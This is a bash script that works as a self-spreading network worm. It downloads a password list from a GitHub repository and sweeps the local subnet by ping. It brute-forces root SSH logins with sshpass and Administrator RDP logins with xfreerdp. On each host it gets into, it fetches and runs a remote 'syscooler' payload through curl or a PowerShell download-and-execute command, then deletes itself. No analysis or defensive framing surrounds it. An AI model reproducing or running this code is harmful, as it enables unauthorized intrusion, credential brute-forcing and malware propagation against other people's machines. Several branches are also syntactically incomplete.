#!/usr/bin/env bash 
curl -s -o pass.txt https://raw.githubusercontent.com/1oneman1/syscooler/main/pass.txt

if ! command -v sshpass &> /dev/null; then
    if command -v apt-get &> /dev/null; then
        apt-get install -y sshpass
    elif command -v yum &> /dev/null; then
        yum install -y sshpass
    else
        exit 1
    fi
fi

if ! command -v xfreerdp &> /dev/null; then
    if command -v apt-get &> /dev/null; then
        apt-get install -y xfreerdp
    elif command -v yum &> /dev/null; then
        yum install -y xfreerdp
    else
        exit 1
    fi
fi

internal_ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
network_segment=$(echo "$internal_ip" | cut -d '.' -f 1-3)

for ((i=1; i<=255; i++))
do
    ip_address="$network_segment.$i"
    ping -c 1 -W 1 "$ip_address" >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        exec 3<>/dev/tcp/"$ip_address"/22
        if [ $? -eq 0 ]; then
            file_path="./pass.txt"
            while IFS= read -r line
            do
                sshpass -p "$line" ssh root@$ip_address -p 22 "curl -s -o syscooler.sh https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.sh | bash  syscooler.sh"
            done < "$file_path"
        else
            exec 3<>/dev/tcp/"$ip_address"/3389
            if [ $? -eq 0 ]; then
                file_path="./pass.txt"
                while IFS= read -r line
                do
                    xfreerdp /v:$ip_address /u:Administrator /p:$line + cmd:"powershell -Command '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/1oneman1/syscooler/main/syscooler.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile'"
                done < "$file_path"
            else

            fi
            exec 3<&-
            exec 3>&-
        fi
    else
        
    fi
done

rm "$0"
